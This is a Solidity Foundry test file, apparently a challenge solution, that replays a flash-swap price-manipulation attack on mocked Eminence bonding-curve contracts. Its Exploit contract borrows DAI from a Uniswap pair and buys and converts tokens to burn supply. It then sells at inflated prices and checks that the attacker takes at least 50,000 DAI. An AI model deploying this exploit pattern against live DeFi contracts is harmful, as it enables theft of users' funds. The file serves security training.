// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {Token} from "src/other/Token.sol";
import {IBondingCurve,IEminenceCurrency} from "src/bonding-curve/EminenceInterfaces.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    IUniswapV2Factory uniFactory;
    IUniswapV2Router02 uniRouter;
    IUniswapV2Pair uniPair; // DAI-USDC trading pair
    IWETH weth;
    Token usdc;
    Token dai;
    IEminenceCurrency eminenceCurrencyBase;
    IEminenceCurrency eminenceCurrency;
    IBondingCurve bancorBondingCurve;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        vm.prank(admin);
        usdc.mint(admin,1_000_000e18);

        vm.prank(admin);
        dai = new Token('DAI','DAI');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=admin; addresses[1]=adminUser;
        amounts[0]=1_000_000e18; amounts[1]=200_000e18;
        vm.prank(admin);
        dai.mintPerUser(addresses,amounts);

        // deploying uniswap contracts
        weth = IWETH(
            deployCode("src/other/uniswap-build/WETH9.json")
        );
        uniFactory = IUniswapV2Factory(
            deployCode(
                "src/other/uniswap-build/UniswapV2Factory.json",
                abi.encode(admin)
            )
        );
        uniRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json",
                abi.encode(address(uniFactory),address(weth))
            )
        );

        // --adding initial liquidity for DAI-USDC
        vm.prank(admin);
        usdc.approve(address(uniRouter),type(uint).max);
        vm.prank(admin);
        dai.approve(address(uniRouter),type(uint).max);

        vm.prank(admin);
        uniRouter.addLiquidity( // creates pair
            address(usdc),address(dai),
            1_000_000e18,1_000_000e18,
            0,0,
            admin,block.timestamp
        );

        uniPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(dai)));

        // deploying core contracts
        vm.prank(admin);
        bancorBondingCurve = IBondingCurve(
            deployCode("out/BancorBondingCurve.sol/BancorBondingCurve.json")
        );

        // --base DAI <-> EMN bonding curve
        vm.prank(admin);
        eminenceCurrencyBase = IEminenceCurrency(
            deployCode(
                "out/EminenceCurrencyBase.sol/EminenceCurrencyBase.json",
                abi.encode('Eminence','EMN',999000,address(dai))
            )  
        );

        // --secondary EMN <-> TOKEN bonding curve
        vm.prank(admin);
        eminenceCurrency = IEminenceCurrency(
            deployCode(
                "out/EminenceCurrency.sol/EminenceCurrency.json",
                abi.encode('eTOKEN','TOKEN',500000,address(eminenceCurrencyBase))
            )
        );

        vm.prank(admin);
        eminenceCurrencyBase.addGM(address(eminenceCurrency));

        // interacting with core contracts
        vm.prank(adminUser);
        dai.approve(address(eminenceCurrencyBase),type(uint).max);
        vm.prank(adminUser);
        eminenceCurrencyBase.approve(address(eminenceCurrency),type(uint).max);

        // --adminUser swaps all DAI to EMN, convert 1/2 EMN to TOKEN
        vm.prank(adminUser);
        eminenceCurrencyBase.buy(200_000e18,0);
        uint256 amount_ = eminenceCurrencyBase.balanceOf(adminUser) / 2;
        vm.prank(adminUser);
        eminenceCurrency.buy(amount_,0);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here
       /* console.log("balance poolBalance : ", dai.balanceOf(address(eminenceCurrencyBase)));
        //console.log("balance totalSupply : ", eminenceCurrencyBase.balanceOf(eminenceCurrencyBase));
        bytes memory data = abi.encodeWithSignature("balanceOf(address)",address(adminUser));
        bytes memory _balance;
        bool sucess;
        (sucess,_balance) = address(eminenceCurrencyBase).call(data);
        console.log("balance EMN adminUser - before the burn : ", abi.decode(_balance,(uint256)));

        data = abi.encodeWithSignature("balanceOf(address)",address(eminenceCurrency));
        (sucess,_balance) = address(eminenceCurrencyBase).call(data);
        console.log("balance EMN eminenceCurrency  ", abi.decode(_balance,(uint256)));

        bytes memory _totalSupply;
        data = abi.encodeWithSignature("totalSupply()");
        (sucess,_totalSupply) = address(eminenceCurrencyBase).call(data);
        console.log("balance EMN totalSupply - before the burn : ", abi.decode(_totalSupply,(uint256)));

        data = abi.encodeWithSignature("balanceOf(address)",address(adminUser));
        (sucess,_balance) = address(eminenceCurrency).call(data);
        console.log("balance TOKEN adminUser : ", abi.decode(_balance,(uint256)));
        
        data = abi.encodeWithSignature("totalSupply()");
        (sucess,_totalSupply) = address(eminenceCurrency).call(data);
        console.log("balance TOKEN totalSupply : ", abi.decode(_totalSupply,(uint256)));

        data = abi.encodeWithSignature("balanceOf(address)",address(adminUser));
        (sucess,_balance) = address(eminenceCurrencyBase).call(data);
        console.log("balance EMN adminUser - after the burn : ", abi.decode(_balance,(uint256)));

        
        data = abi.encodeWithSignature("totalSupply()");
        (sucess,_totalSupply) = address(eminenceCurrencyBase).call(data);
        console.log("balance EMN totalSupply - after the burn : ", abi.decode(_totalSupply,(uint256)));

        eminenceCurrency.buy(0,0);*/

        Exploit exploit = new Exploit(address(dai),address(eminenceCurrencyBase),address(eminenceCurrency),address(uniPair));
        exploit.pwn();

        vm.stopPrank();

        
        /*console.log("amount DAI with totalSupply : ",abi.decode(_totalSupply,(uint256)) ," of EMN : ",IBondingCurve().calculateSaleReturn());
        uint totalSupply_ = abi.decode(_totalSupply,(uint256)) - (abi.decode(_totalSupply,(uint256)) / 2);
        console.log("amount DAI with totalSupply : ",totalSupply_ ," of EMN : ",IBondingCurve().calculateSaleReturn());
        console.log("amount DAI with totalSupply : ",abi.decode(_totalSupply,(uint256)) ," of EMN : ",IBondingCurve().calculateSaleReturn());
        */
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker steals at least 50k in DAI
        assertGe(dai.balanceOf(attacker),50_000e18);

    }

}

contract Exploit{
    
    address owner;
    IUniswapV2Pair uniPair; // DAI-USDC trading pair
    IWETH weth;
    Token usdc;
    Token dai;
    IEminenceCurrency eminenceCurrencyBase;
    IEminenceCurrency eminenceCurrency;

    constructor(address _dai, address _eminenceCurrencyBase, address _eminenceCurrency, address _uniPair ){
        owner = msg.sender;
        dai = Token(_dai);
        eminenceCurrencyBase = IEminenceCurrency(_eminenceCurrencyBase);
        eminenceCurrency = IEminenceCurrency(_eminenceCurrency);
        uniPair = IUniswapV2Pair(_uniPair);
    }

    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
        uint256 daiAmount = dai.balanceOf(address(this));
        console.log("balance dai of exploit : ",daiAmount);
        
        dai.approve(address(eminenceCurrencyBase),type(uint).max);
        eminenceCurrencyBase.approve(address(eminenceCurrency),type(uint).max);

        // --exploit swaps all DAI to EMN, convert 1/2 EMN to TOKEN 
        eminenceCurrencyBase.buy(daiAmount,0);
        uint256 eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));

        uint256 amount_ = eminenceCurrencyBaseAmount / 2;
        eminenceCurrency.buy(amount_,0);
        //With the convert we just burn the supply of EMN so for the first bonding curve if we sell we will gain higher that it supposed to be

        eminenceCurrencyBase.sell(amount_,0);  

        uint256 eminenceCurrencyAmount = eminenceCurrency.balanceOf(address(this));
        eminenceCurrency.sell(eminenceCurrencyAmount,0);  
        eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));
        eminenceCurrencyBase.sell(eminenceCurrencyBaseAmount,0);  

        
        console.log("balance dai of exploit : ",dai.balanceOf(address(this)));
        console.log("amount to repay : ",(amount1Out * 103 /100)+1);//yeah the premium is a bit to high

        dai.transfer(address(uniPair), (amount1Out * 103 /100)+1);
        dai.transfer(owner, dai.balanceOf(address(this)));
        console.log("balance dai of attacker : ",dai.balanceOf(address(owner)));
    }
    function pwn() external {
        uniPair.swap(0,999_999e18,address(this), new bytes(1));
    }
}